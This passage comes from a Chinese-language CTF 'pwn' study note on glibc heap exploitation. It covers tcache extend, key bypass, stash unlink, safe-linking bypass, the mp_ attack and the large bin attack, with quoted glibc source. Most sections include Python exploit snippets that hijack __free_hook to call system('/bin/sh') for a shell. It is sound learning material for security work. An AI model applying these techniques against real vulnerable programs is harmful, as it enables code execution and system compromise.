的地址，覆盖其中一个地址为【malloc_hook-0x13】地址来劫持 malloc</li><li>若要向 malloc_hook 地址申请 0x20 的 chunk，需要劫持 tcache_entry 中属于 0x30（0x20+0x10）的位置</li></ul><h4 id=tcache-extend>Tcache Extend</h4><ul><li>存在 UAF 及堆溢出 8 字节，修改下一个 chunk 的 size 字段，堆块堆叠</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>))</span> <span class=c1># chunk1 size=0x100</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># tcache bin -&gt; chunk1(包含chunk2)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0xf8</span><span class=p>)</span> <span class=c1># 将chunk1申请出来，chunk1与chunk2堆叠</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># 释放chunk2：tcache bin -&gt; chunk2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x20</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>target_addr</span><span class=p>))</span> <span class=c1># 修改chunk1，实际覆盖chunk2的fd指针劫持</span></span></span></code></pre></div></div><h4 id=tcache-key-bypass>Tcache key Bypass</h4><p>① 利用 UAF 将 free chunk 中记录的 tcache key 清除，使其不等于 tcache 结构体地址来绕过该检测，可以 double free</p><p>当 tcache count 为 0 时，即使其指向 target 也无法申请出来，尝试申请 chunk 将 count 变大</p><p>② <strong>house of kauri</strong></p><p>③ tcache stash with fastbin double free</p><ul><li>fastbin 中没有严密 double free 检测，填满 tcache 后在 fastbin 完成 double free</li><li>通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span> <span class=n>new</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>9</span><span class=p>):</span> <span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=c1># 填满tcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># fastbin double free</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>9</span><span class=p>):</span> <span class=n>new</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>)</span> <span class=c1># 耗尽tcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>)</span> <span class=c1># 触发stash</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>target</span><span class=p>))</span> <span class=c1># 然后malloc 3次申请出target</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241128153011470.png alt=图片无法加载><p>④ <strong>House of Botcake</strong></p><h4 id=fastbin-reverse>Fastbin Reverse</h4><ul><li>calloc 申请内存不会从 tcache 中获取，直接从堆块获取，取完后会通过 stash 机制将 fastbin 中 chunk 放入 tcache 中</li><li>修改 fastbin 中 chunk 的 fd 指针，会在 fd+0x10(target)地址处写入极大值</li></ul><p><strong>calloc 情况</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20241128201222311.png alt=图片无法加载><p><strong>malloc 情况</strong></p><ul><li>由于 malloc 从 tcache bin 中取，需要先消耗完 tcache 中的 chunk 再触发 stash</li><li>为防止 target 的 fd 指向无效数据使 stash 失败，需要在 fastbin 中预留 6 个 chunk 填充 tcache</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>14</span><span class=p>):</span> <span class=n>new</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># 7个填充chunk，1个利用chunk，6个预留chunk</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>14</span><span class=p>):</span> <span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=c1># 7 tcache bin，7 fast bin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># tcache 空缺一个</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=c1># 同时进入fastbin 和 tcache中</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># 从 tcache 中取</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>))</span> <span class=c1># 修改fd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>7</span><span class=p>):</span> <span class=n>new</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># 取出所有tcache bin中chunk</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># 触发stash，fastbin中chunk进入tcache bin中，【tcache: __free_hook-&gt;6 chunk】</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># 劫持__free_hook地址</span></span></span></code></pre></div></div><h4 id=tcache-stash-unlink>Tcache Stash Unlink</h4><ol><li>从 small bin 取出堆块时，会对该堆块的 bk 指向堆块的 fd 检查</li><li><strong>最终将 small bin 中剩余堆块放入 tcache 直到 tcache 填满过程无检查</strong></li></ol><p><strong>利用</strong></p><ul><li>small bin 2 个堆块时绕过第一次从 small bin 取堆块检查，tcache 放 5 个堆块</li><li>最终效果：任意地址 malloc，任意地址写值</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241214184017817.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># tcache: 7chunk, small bin : chunk8,9</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span> <span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x400</span><span class=p>)</span> <span class=c1># 申请大于0x200的将chunk8,9移到small bin中</span>
</span></span><span class=line><span class=cl><span class=c1># 申请chunk1,2出来</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 修改chunk8指向__free_hook, 且此时__free_hook假堆块的bk需要指向合理堆地址(可通过任意地址写大数构造)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>合理fd地址</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>calloc_add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># 申请出chunk9, __free_hook假堆块进入tcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># 申请出__free_hook</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=c1># getshell</span></span></span></code></pre></div></div><h4 id=safe-linking-bypass>Safe-linking Bypass</h4><p>glibc-2.33 引入的新检查机制</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cm>/* 加密函数 */</span>
</span></span><span class=line><span class=cl><span class=cp>#define PROTECT_PTR(pos, ptr)
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=p>((</span><span class=nf>__typeof</span> <span class=p>(</span><span class=n>ptr</span><span class=p>))</span> <span class=p>((((</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>pos</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>ptr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=cm>/* 解密函数 */</span>
</span></span><span class=line><span class=cl><span class=cp>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span></span></code></pre></div></div><p>即</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=p>((</span><span class=o>&amp;</span><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>)</span><span class=o>&gt;&gt;</span><span class=mi>12</span><span class=p>)</span> <span class=o>^</span> <span class=nf>REVEAL_PTR</span><span class=p>(</span><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>//当前堆块的fd等于 (当前堆块fd的地址 &gt;&gt; 12) ^ 原来的fd（相邻先被释放的堆块地址）
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 第一块被释放: fd = (0x123456789abc &gt;&gt; 12) ^ 0 = 0x123456789
</span></span></span><span class=line><span class=cl><span class=c1>// 第二块被释放: fd = (0x123456789adc &gt;&gt; 12) ^ 0x123456789abc = 0x1235753dfd35
</span></span></span></code></pre></div></div><p><strong>绕过</strong></p><ul><li>通过 UAF 填写<code>fd</code>的值为 0（初值），之后泄露出该<code>tcache bin</code>堆块的<code>fd</code>的值实则为该堆块地址的前 9 位，偏移计算获得堆地址</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>heap_addr</span> <span class=o>=</span> <span class=p>(((</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>^</span> <span class=n>pre_heap_addr</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span><span class=p>))</span> <span class=o>+</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=nb>next</span> <span class=o>=</span> <span class=p>((</span><span class=n>heap_addr</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span><span class=p>))</span> <span class=o>^</span> <span class=n>free_hook_addr</span></span></span></code></pre></div></div><ul><li>覆盖<code>fd</code>为与<code>__free_hook</code>地址异或后的<code>next</code>地址，申请 2 个同样大小堆块，第二块为 fd 指向的<code>__free_hook</code>地址</li><li>写入<code>system</code>地址，调用<code>free()</code>包含<code>'/bin/sh'</code>的堆块达成 getshell</li></ul><h4 id=mp_-attack>mp_ attack</h4><ul><li>glibc-2.31，通过<code>large bin attack</code>修改<code>mp_.tcach_bins</code>为极大值/堆地址</li><li>该值记录 tcache bin 的最大索引值，超过该值的堆块都不属于 tcache bin</li></ul><p><strong>利用</strong></p><ul><li><p>修改<code>tcache_bins</code>后删除 0x500 大小的 chunk z 时，会进入到 tcache 中，且此时 tcache 的结构体会和堆重叠</p></li><li><p>实际过程可通过 gdb 调试获取【1】增加的 counts 值以及【2】何处地址值更改为了 e</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// tcache_put 函数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>tcache_entry</span> <span class=o>*</span><span class=n>e</span> <span class=o>=</span> <span class=p>(</span><span class=n>tcache_entry</span> <span class=o>*</span><span class=p>)</span> <span class=nf>chunk2mem</span> <span class=p>(</span><span class=n>chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>e</span><span class=o>-&gt;</span><span class=n>key</span> <span class=o>=</span> <span class=n>tcache</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>e</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>e</span><span class=p>;</span> <span class=c1>// 【2】
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>++</span><span class=p>(</span><span class=n>tcache</span><span class=o>-&gt;</span><span class=n>counts</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]);</span> <span class=c1>// 【1】
</span></span></span></code></pre></div></div><p>此时 chunk z 的 bk 指向<code>heap_base_addr + 0x10</code>处，且由于 tcache->counts+1，gdb 观察时会出现 tcache 为 0x0001000 情况，通过【2】找到可控 chunk x，gdb 呈现：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chunk x_addr --&gt; <span class=m>0</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>chunk x_addr + offset --&gt; chunk z_addr</span></span></code></pre></div></div><p>修改可控<code>chunk x_addr + offset</code>为<code>__free_hook</code>地址，申请 0x500 大小 chunk 时 tcache 将申请出<code>__free_hook</code>地址，修改为<code>system</code>，free 带有<code>/bin/sh</code>的 chunk 达成利用</p><h3 id=large-bin-attack>Large bin attack</h3><h4 id=地址泄露-1>地址泄露</h4><ul><li>保护全开，glibc-2.31，通过 UAF 利用</li><li><strong>0x4FF &lt; size &lt; 0xFFF</strong>：申请对应 large bin，<code>malloc</code> 时，会遍历 <code>unsorted bin</code>，若无法<strong>精确分配</strong>或不满足切割分配条件，会将该 <code>chunk </code>置入相应大小的 <code>bin</code>(<strong>large bins</strong>) 中</li></ul><p><strong>泄露 libc 基址</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x600</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x700</span><span class=p>)</span> <span class=c1># 隔开 top chunk</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 1 进入 unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># 3 并入 top chunk</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x700</span><span class=p>)</span> <span class=c1># free chunk 1 无法满足 进入 large bins</span>
</span></span><span class=line><span class=cl><span class=n>browse</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 同样可获取一个到main_arena偏移一段距离的地址, 泄露libc基址</span></span></span></code></pre></div></div><p><strong>获取堆地址</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mh>0x600</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mh>0x6e0</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>create</span><span class=p>(</span><span class=mh>0x6e0</span><span class=p>)</span> <span class=c1># 2 将unsorted bin中的 0 块放入large bin中</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 看 0 的fd, bk泄露 main_arena偏移地址来得到libc地址</span>
</span></span><span class=line><span class=cl><span class=c1># 看 0 的fd_nextsize, bk_nextsize来得到堆的偏移地址</span>
</span></span><span class=line><span class=cl><span class=c1># fd=bk, fd_nextsize=bk_nextsize</span></span></span></code></pre></div></div><p>注：泄露地址 fd 结尾出现 00 截断时，编辑该堆块填入&rsquo;a&rsquo;覆盖 00</p><h4 id=目标地址写大数>目标地址写大数</h4><p><strong>原理</strong></p><ul><li>glibc-2.30 前，chunk 链入 <code>large bin</code> 过程缺乏对 <code>bk</code> 和 <code>bk_nextsize</code> 指针检查，利用修改可进行<strong>两处任意地址写</strong></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=c1>// _int_malloc 中遍历 unsorted bin，若不符合申请大小的堆块按范围放入large/small bin中
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nf>in_smallbin_range</span><span class=p>(</span><span class=n>size</span><span class=p>)){...}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>victim_index</span> <span class=o>=</span> <span class=nf>largebin_index</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>bck</span> <span class=o>=</span> <span class=nf>bin_at</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>victim_index</span><span class=p>);</span> <span class=c1>// large bin
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fwd</span> <span class=o>=</span> <span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>					<span class=c1>// large bin 最大 chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// 更新bk_nextsize和fd_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>fwd</span> <span class=o>!=</span> <span class=n>bck</span><span class=p>){</span> <span class=c1>// large bin 非空
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>size</span> <span class=o>|=</span> <span class=n>PREV_INUSE</span><span class=p>;</span> <span class=p>...</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>size</span><span class=p>)</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>bck</span><span class=o>-&gt;</span><span class=n>bk</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)){...}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span><span class=p>{</span><span class=c1>// size 大于等于 large bin 最小 chunk 大小
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>size</span> <span class=o>&lt;</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>){</span> <span class=c1>// 遍历找到第一个小于等于victim size的chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=n>fwd</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span><span class=p>;</span> <span class=p>...</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>size</span> <span class=o>==</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>){...}</span> <span class=c1>// 不更新fd_nextsize和bk_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>				<span class=c1>//【1】
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=p>;</span>	<span class=c1>//【2】
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>				<span class=c1>//【3】
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span><span class=c1>//【4】
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
